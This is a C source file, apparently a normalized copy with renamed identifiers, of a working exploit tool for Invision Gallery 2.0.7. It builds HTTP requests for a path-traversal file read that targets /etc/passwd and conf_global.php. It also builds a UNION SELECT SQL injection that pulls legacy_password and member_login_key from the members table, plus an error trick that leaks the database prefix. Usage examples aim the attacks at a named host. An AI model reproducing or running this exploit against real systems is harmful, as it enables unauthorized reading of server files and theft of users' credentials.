
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int WSADATA ;


 int FUNC_0 (char*,char*,char*) ;
 int FUNC_1 (int,int) ;
 int FUNC_2 () ;
 int FUNC_3 (int ,int *) ;
 int FUNC_4 (char*) ;
 int FUNC_5 (char*,char*) ;
 scalar_t__ FUNC_6 (char*,char*) ;
 int FUNC_7 (char*,char*) ;

int FUNC_8(int VAR_0,char * VAR_1[])
{
WSADATA VAR_2;
FUNC_3(FUNC_1(2,2),&VAR_2);

  FUNC_4("\n ...............................................................\n");
        FUNC_4("  Invision Gallery 2.0.7 ReadFile() & SQL injection exploit       \n");
        FUNC_4("         (c)oded by _1nf3ct0r_ // Hell Knights Crew               \n");
  FUNC_4("               http://hellknights.void.ru/                        \n");
  FUNC_4("  Gr33tz: blackybr, 1dt.w0lf, ShadOS, ZaCo, SkvoznoY, HATS-Team   \n");
  FUNC_4(" ...............................................................  \n");

 if (VAR_0 == 1) {

FUNC_4("\n\n [+] ReadFile():\n");
FUNC_4("  - syntax:\n");
FUNC_4("  readfile 1 <host> <pathtoindex> <localfile> \n");
FUNC_4("  readfile 2 <host> <pathtoindex> <localfile>   -- try it 1f readfile[1] failed \n");
FUNC_4("  - params: \n");
FUNC_4("  <localfile> -  path to local file (../file), f0r example: ../../../../../etc/passwd\n");
FUNC_4("  s0, 1f u want to get local path to IPB 7ry th1s: ../../hellknightscrewxploit  \n");
FUNC_4("  - examples:\n");
FUNC_4("  readfile 1 asd.ru index.php ../../../../../../etc/passwd\n");
FUNC_4("  readfile 1 asd.ru forum/index.php ../../conf_global.php\n");
FUNC_4("  readfile 1 asd.ru forum/index.php ../../conf_global.php%00\n\n\n");
FUNC_4(" [+] SQL-injection:\n");
FUNC_4("  - syntax\n");
FUNC_4("  sqlinject <host> <pathtoindex> <member_id> <prefix> <column> <table>\n");
FUNC_4("  getprefix <host> <pathtoindex>   -- get database prefix from IPB error  \n");
FUNC_4("  - params:\n");
FUNC_4("  <member_id> -  member's id for SQL-injection result, for example: 1\n");
FUNC_4("  <column>    -  ipb members' column to get. for example: ip_adress, email.\n");
FUNC_4("  <table>     -  ipb table to use. f0r example: member\n");
FUNC_4("  <prefix>    -  database prefix. \n");
FUNC_4("  - examples:\n");
FUNC_4("  ig.exe sqlinject asd.ru index.php legacy_password ibf_ members 1  \n");
FUNC_4("  ig.exe sqlinject asd.ru index.php member_login_key  ibf_ members 1\n");
FUNC_4("  ig.exe sqlinject asd.ru forum/index.php ip_adress ibf_ member 5\n\n");
             return 1;
                }

char * VAR_3 = VAR_1[1];



if (FUNC_6(VAR_3,"readfile")==0)
{
char * VAR_4 = VAR_1[2];
char * VAR_5 = ((void*)0); VAR_5 = VAR_1[4];
char * VAR_6 = VAR_1[5];
char * VAR_7 = VAR_1[3];
 if (FUNC_6(VAR_4,"1")==0)
 {
 char VAR_8[1024];
 FUNC_7(VAR_8, "GET /");
 FUNC_5(VAR_8, VAR_5);
 FUNC_5(VAR_8, "?act=module&module=gallery&cmd=viewimage&img=&file_type=&dir=");
 FUNC_5(VAR_8, VAR_6);
    FUNC_5(VAR_8, " HTTP/1.0\r\nHost: ");
 FUNC_5(VAR_8, VAR_7);
 FUNC_5(VAR_8, "\r\n\r\n");
FUNC_0(VAR_8, "readfile", VAR_7);

 }
 else if (FUNC_6(VAR_4,"2")==0)
 {
 char VAR_9[1024];
 FUNC_7(VAR_9, "GET /");
 FUNC_5(VAR_9, VAR_5);
 FUNC_5(VAR_9, "?act=gallery&code=viewimage&img=index.gif&dir=");
 FUNC_5(VAR_9, VAR_6);
    FUNC_5(VAR_9, " HTTP/1.0\r\nHost: ");
 FUNC_5(VAR_9, VAR_7);
 FUNC_5(VAR_9, "\r\n\r\n");
FUNC_0(VAR_9, "readfile", VAR_7);
 }


}
if(FUNC_6(VAR_3,"sqlinject")==0)
{
char * VAR_10 = VAR_1[2];
char * VAR_11 = VAR_1[3];
char * VAR_12 = VAR_1[5];
char * VAR_13 = VAR_1[4];
char * VAR_14 = VAR_1[6];
char * VAR_15 = VAR_1[7];

 char VAR_16[1024];
 FUNC_7(VAR_16, "GET /");
 FUNC_5(VAR_16, VAR_11);
 FUNC_5(VAR_16, "?automodule=gallery&cmd=rate&img=1&rating=1&album=-1%20union%20select%201,");
 FUNC_5(VAR_16, VAR_13);
 FUNC_5(VAR_16, ",1,1,1,1,1,1,1,1%20FROM%20");
 FUNC_5(VAR_16, VAR_12);
 FUNC_5(VAR_16, VAR_14);
 FUNC_5(VAR_16, "%20WHERE%20id=");
 FUNC_5(VAR_16, VAR_15);
 FUNC_5(VAR_16, "/*31337*/");
    FUNC_5(VAR_16, " HTTP/1.0\r\nHost: ");
 FUNC_5(VAR_16, VAR_10);
 FUNC_5(VAR_16, "\r\n\r\n");
    FUNC_0(VAR_16, "sqlinject", VAR_10);
}
if (FUNC_6(VAR_3,"getprefix")==0)
{
char * VAR_17 = VAR_1[3];
char * VAR_18 = VAR_1[2];
 char VAR_19[1024];
 FUNC_7(VAR_19, "GET /");
 FUNC_5(VAR_19, VAR_17);
 FUNC_5(VAR_19, "?automodule=gallery&cmd=rate&img=1&rating=1&album=-1%20hellknightscrew");
    FUNC_5(VAR_19, " HTTP/1.0\r\nHost: ");
 FUNC_5(VAR_19, VAR_18);
 FUNC_5(VAR_19, "\r\n\r\n");
FUNC_4("\n\n\n[!] u can get database prefix from this error. example: SELECT * FROM <PREFIX>gallery_albums\n\n");
FUNC_0(VAR_19, "readfile", VAR_18);
}

FUNC_2();
 return 0;
}
